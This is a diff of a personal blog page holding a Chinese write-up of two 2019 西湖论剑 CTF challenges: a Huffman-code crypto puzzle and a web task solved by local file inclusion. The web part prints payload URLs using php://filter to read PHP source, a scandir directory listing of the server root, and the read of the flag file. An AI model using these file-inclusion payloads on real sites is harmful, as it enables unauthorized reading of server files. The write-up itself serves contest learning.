@@ -163,7 +163,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">诗酒趁年华</p>
+        <h1 class="site-subtitle" itemprop="description">诗酒趁年华</h1>
       
   </div>
 
@@ -314,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">西湖论剑2019</h1>
+          <h2 class="post-title" itemprop="name headline">西湖论剑2019</h2>
         
 
         <div class="post-meta">
@@ -382,7 +382,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  365 字
+                  415 字
                 </span>
               
 
@@ -398,7 +398,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -419,14 +419,14 @@
       
 
       
-        <h1 id="CRYPTO哈夫曼之谜"><a href="#CRYPTO哈夫曼之谜" class="headerlink" title="CRYPTO哈夫曼之谜"></a>CRYPTO哈夫曼之谜</h1><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span></span><br><span class="line"><span class="selector-tag">d</span><span class="selector-pseudo">:9</span></span><br><span class="line"><span class="selector-tag">g</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">f</span><span class="selector-pseudo">:5</span></span><br><span class="line"><span class="selector-tag">l</span><span class="selector-pseudo">:1</span></span><br><span class="line"><span class="selector-tag">0</span><span class="selector-pseudo">:7</span></span><br><span class="line"><span class="selector-tag">5</span><span class="selector-pseudo">:9</span></span><br><span class="line">&#123;<span class="selector-pseudo">:1</span></span><br><span class="line">&#125;<span class="selector-pseudo">:1</span></span><br></pre></td></tr></table></figure>
+        <h1 id="CRYPTO哈夫曼之谜"><a href="#CRYPTO哈夫曼之谜" class="headerlink" title="CRYPTO哈夫曼之谜"></a>CRYPTO哈夫曼之谜</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span><br><span class="line"></span><br><span class="line">a:4</span><br><span class="line">d:9</span><br><span class="line">g:1</span><br><span class="line">f:5</span><br><span class="line">l:1</span><br><span class="line">0:7</span><br><span class="line">5:9</span><br><span class="line">&#123;:1</span><br><span class="line">&#125;:1</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> huffman</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line">t1=huffman.codebook([(<span class="string">'a'</span>, <span class="number">4</span>), (<span class="string">'d'</span>, <span class="number">9</span>), (<span class="string">'g'</span>, <span class="number">1</span>), (<span class="string">'f'</span>, <span class="number">5</span>),(<span class="string">'l'</span>, <span class="number">1</span>),(<span class="string">'0'</span>, <span class="number">7</span>),(<span class="string">'5'</span>, <span class="number">9</span>),(<span class="string">'&#123;'</span>, <span class="number">1</span>),(<span class="string">'&#125;'</span>, <span class="number">1</span>)])</span><br><span class="line">print(t1)</span><br><span class="line"><span class="comment">#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;</span></span><br><span class="line"><span class="comment">#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功</span></span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<p>#babyt3<br><a href="http://ctf1.linkedbyx.com:10300" target="_blank" rel="noopener">http://ctf1.linkedbyx.com:10300</a><br>首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码<br>payload:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://ctf1.linkedbyx.com:<span class="number">10300</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure></p>
+<p>#babyt3<br><a href="http://ctf1.linkedbyx.com:10300" target="_blank" rel="noopener">http://ctf1.linkedbyx.com:10300</a><br>首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure></p>
 <p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure></p>
-<p>scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的<br>payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf1.linkedbyx.com:<span class="number">10300</span><span class="regexp">/dir.php?dir=/</span>..</span><br></pre></td></tr></table></figure></p>
-<p>返回目录信息<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">25</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">1</span>) <span class="string">"."</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">2</span>) <span class="string">".."</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">10</span>) <span class="string">".dockerenv"</span> [<span class="number">3</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"bin"</span> [<span class="number">4</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"boot"</span> [<span class="number">5</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"dev"</span> [<span class="number">6</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"etc"</span> [<span class="number">7</span>]=&gt; <span class="type">string</span>(<span class="number">16</span>) <span class="string">"ffffflag_1s_Her4"</span> [<span class="number">8</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"home"</span> [<span class="number">9</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"lib"</span> [<span class="number">10</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"lib64"</span> [<span class="number">11</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"media"</span> [<span class="number">12</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"mnt"</span> [<span class="number">13</span>]=&gt; <span class="type">string</span>(<span class="number">7</span>) <span class="string">"my_init"</span> [<span class="number">14</span>]=&gt; <span class="type">string</span>(<span class="number">10</span>) <span class="string">"my_service"</span> [<span class="number">15</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"opt"</span> [<span class="number">16</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"proc"</span> [<span class="number">17</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"root"</span> [<span class="number">18</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"run"</span> [<span class="number">19</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"sbin"</span> [<span class="number">20</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"srv"</span> [<span class="number">21</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"sys"</span> [<span class="number">22</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"tmp"</span> [<span class="number">23</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"usr"</span> [<span class="number">24</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"var"</span> &#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现ffffflag_1s_Her4，再读取就好了，得到flag<br>payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf1.linkedbyx.com:<span class="number">10300</span><span class="regexp">/?file=/</span>ffffflag_1s_Her4</span><br></pre></td></tr></table></figure></p>
+<p>scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/dir.php?dir=/..</span><br></pre></td></tr></table></figure></p>
+<p>返回目录信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(25) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(16) &quot;ffffflag_1s_Her4&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(7) &quot;my_init&quot; [14]=&gt; string(10) &quot;my_service&quot; [15]=&gt; string(3) &quot;opt&quot; [16]=&gt; string(4) &quot;proc&quot; [17]=&gt; string(4) &quot;root&quot; [18]=&gt; string(3) &quot;run&quot; [19]=&gt; string(4) &quot;sbin&quot; [20]=&gt; string(3) &quot;srv&quot; [21]=&gt; string(3) &quot;sys&quot; [22]=&gt; string(3) &quot;tmp&quot; [23]=&gt; string(3) &quot;usr&quot; [24]=&gt; string(3) &quot;var&quot; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现ffffflag_1s_Her4，再读取就好了，得到flag<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -581,7 +581,7 @@
               <img class="site-author-image" itemprop="image" src="http://i2.bvimg.com/665720/a3df83bbe2d864de.jpg" alt="晨曦远">
             
               <p class="site-author-name" itemprop="name">晨曦远</p>
-              <p class="site-description motion-element" itemprop="description">一只大一单身狗</p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -591,7 +591,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -752,7 +752,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">10.9k</span>
+    <span title="Site words total count">11.1k</span>
   
 </div>
 
